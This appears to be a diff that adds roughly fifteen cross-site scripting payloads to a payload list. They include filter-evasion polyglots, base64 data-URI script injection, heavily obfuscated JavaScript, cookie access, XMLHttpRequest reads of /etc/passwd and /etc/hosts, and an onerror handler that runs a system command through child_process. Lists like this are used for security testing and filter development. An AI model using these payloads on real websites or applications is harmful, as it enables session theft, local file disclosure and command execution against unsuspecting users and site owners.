@@ -1,3 +1,38 @@
+<select><noembed></delect><script x='a@b'a> y='a@b'//a@b%0a\u0061lert(1)</script x>
+
+&pid=%27";}</script><script>prompt(document.domain);</script>
+
+/*-/*`/*\`/*%27/*%22/**/(/*%20*/oNcliCk=alert()%20)//%0D%0A%0d%0a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E\x3csVg/%3CsVg/oNloAd=alert()//%3E\x3e
+
+x%zcscript%zealert(document?.cookie)%zc/script%ze
+
+''.replace.call`1${/.../}${alert}`
+
+-top['al\x65rt']('XD')-
+
+<object data='data:text/html;base64,PFNDUklQVD5hbGVydCgneHNzJyk7PC9TQ1JJUFQ+' /src>
+
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+
+<iframe src="data:text/html;base64, PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="></iframe>
+
+<a href="data:text/html;base64, PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">test</a>
+
+\"\u003cinput/onfocus=_=confirm,_(123)\u003e
+
+<script>
+𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++], 𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀] +(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀] +𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
+</script>
+
+<script>x=newXMLHttpRequest;x.onload=function(){document.write(this.responseText)};http://x.open(‘GET’,’file:///etc/hosts’);x.send();</script><script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};http://x.open(‘GET’,’file:///etc/passwd’);x.send();</script> 
+
+$.parseHTML("< img src='z' onerror='alert(\"xss\")'>");
+$("< img onerror='alert(/xss/);'>.attr('src','s')");
+
+<s\c\r\i\p\t>a\l\e\r\t\(\d\o\c\u\m\e\n\t\.\d\o\m\a\i\n\)\<\/\s\c\r\i\p\t\>
+
+<img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>">
+
 '"onclick=(co\u006efirm)?.`0`><sVg/i="${{7*7}}"oNload=" 0>(pro\u006dpt)`1`"></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert`2`>%22%3E%3CSvg/onload=confirm`3`//<Script/src=//xSs></scripT>
 
 <style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>
